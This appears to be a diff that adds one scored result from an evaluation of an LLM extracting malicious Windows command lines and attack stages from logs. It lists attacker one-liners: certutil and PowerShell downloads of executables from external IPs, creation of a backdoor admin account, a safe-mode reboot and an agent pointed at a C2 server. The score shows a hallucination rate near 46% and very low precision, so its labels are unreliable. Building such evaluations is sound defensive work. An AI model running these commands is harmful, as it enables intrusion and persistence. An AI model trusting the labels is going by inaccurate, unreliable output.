@@ -1,0 +1,150 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil.exe  -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" \\?\\c:\\windows\\syswow64\\cmd.exe --typing-speed=50 ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "\"c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "\"c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe\" --crash-handler \\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "Cmd.exe /C start c:\\windows\\temp\\f4fe5dd1-ce29-4938-833a-4bc00317da92.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "Certutil.exe -urlcache -split -f http://127.0.0.1:8080/injector.dll C:\\Users\\Public\\injector.dll",
+        "stage": "Execution"
+      },
+      {
+        "command": "Cmd.exe /C \"\\?\\c:\\users\\public\\injector.dll\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "Cmd.exe /C start C:\\Users\\Public\\injector.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:/phpStudy/WWW&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Cmd.exe /C \"bcdedit /set safeboot minimal & reboot\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Cmd.exe /C \"powercfg -e Be/OPTIMIZED PERFORMANCE\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "net \\user \\\\oop o\\\\33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.254:8888/exploit.zip','C:\\Users\\Public\\.exp' )",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell -executionpolicy bypass -command iwr -uri http://192.168.0.254 :8888/exploit.ps1 -outfile C:\\Users\\Public\\.test.pwsh ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe  -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:/phpStudy/WWW&netstat -ano | findstr 88&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netstat -ano ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "findstr  88",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Cmd.exe /C start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\ywm.exe",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "This attack involves multiple adversaries accessing the victim\u2019s host via various exploits, gaining initial access with legitimate applications, downloading executables, escalating privileges, stealing sensitive credentials, and maintaining persistence.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36785,
+      "completion_tokens": 2891,
+      "total_tokens": 39676,
+      "wall_clock_s": 36.878,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.04,
+      "recall": 0.16666666666666666,
+      "f1": 0.06451612903225806,
+      "tp": 1,
+      "fp": 24,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.04,
+      "recall": 0.16666666666666666,
+      "f1": 0.06451612903225806,
+      "tp": 1,
+      "fp": 24,
+      "fn": 5,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.46153846153846156,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36785,
+      "completion_tokens": 2891,
+      "total_tokens": 39676,
+      "wall_clock_s": 36.878,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
